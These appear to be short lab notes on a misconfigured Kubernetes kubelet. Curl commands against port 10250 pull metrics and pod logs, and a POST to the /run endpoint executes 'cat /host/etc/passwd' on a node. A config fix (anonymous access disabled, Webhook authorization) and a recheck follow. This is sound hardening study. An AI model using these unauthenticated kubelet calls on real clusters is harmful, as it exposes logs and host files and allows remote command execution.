
# get infos

curl -k https://$IP:10250/metrics
curl -k https://$IP:10250/logs/
curl -k https://$IP:10250/logs/pods/    <!-- last slash is important -->\
curl -k https://$IP:10250/logs/pods/kube-system_etcd-lod_25977589a391e2bdeecfd7f56555caca/etcd/0.log

# get info about the host

curl -XPOST -k https://$IP:10250/run/default/my-suboptimal-pod/my-ubuntu -d "cmd=cat /host/etc/passwd"

# fix it

vi /var/lib/kubelet/config.yaml
=> enabled: false
=> mode: Webhook
<!-- systemctl daemon-reload -->
systemctl restart kubelet
<!-- systemctl status kubelet -->

... run curls again
